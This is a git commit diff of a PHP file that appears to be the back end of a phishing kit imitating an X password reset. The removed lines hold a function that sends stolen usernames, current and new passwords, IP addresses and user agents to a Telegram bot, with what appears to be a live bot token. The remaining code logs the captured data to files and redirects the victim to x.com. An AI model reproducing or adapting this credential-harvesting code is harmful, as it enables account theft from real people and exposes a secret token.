86ca52ccc9a21d4cdb5c7bc29fc7762e10125cfa
elderand <98284909+elderand@users.noreply.github.com>
2025-03-31 00:44:18 -0400

    Update test.php

--- test.php
+++ test.php
@@ -12,46 +12,10 @@ $timeOfLogin = date('m/d/y | h:i:s A | T');
 
 $filePath = "logs-TyArYBXT7M/" . hash('sha256', $ipAddress) . ".txt";
 
-function sendToTelegram($message) {
-    $botToken = '7717200730:AAFr2UmhOG7Aek-aKw7iMe4PCGCylv3ZrAE';
-    $chatId = '-4723096514';
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message,
-        'parse_mode' => 'HTML'
-    ];
-    
-    $options = [
-        'http' => [
-            'header'  => "Content-type: application/x-www-form-urlencoded",
-            'method'  => 'POST',
-            'content' => http_build_query($data)
-        ]
-    ];
-    
-    $context  = stream_context_create($options);
-    file_get_contents($url, false, $context);
-}
-
 if ($current_password === 'N/A' || $password === 'N/A') {
     echo "<script type='text/javascript'>window.location.href = 'https://x.com/?PasswordReset=false';</script>";
 }
 else {
-$message = "
-🤑 <i>New Lick Detected\n</i>
-🔎 <b>Username:</b> $username
-🧑‍💻 <b>Display Name:</b> $displayName
-🔐 <b>Current Password:</b> $current_password
-🆕 <b>Attempted New Password:</b> $password
-🌐 <b>IP Address:</b> $ipAddress
-📱 <b>User Agent:</b> $userAgent
-⏰ <b>Time of Login:</b> $timeOfLogin
-";
-    
-    sendToTelegram($message);
-    
     if (!is_dir('logs-TyArYBXT7M')) {
         mkdir('logs-TyArYBXT7M', 0755, true);
     }
@@ -77,6 +41,5 @@ $message = "
             }, 1000);
           </script>";
 }
-
 die();
 ?>
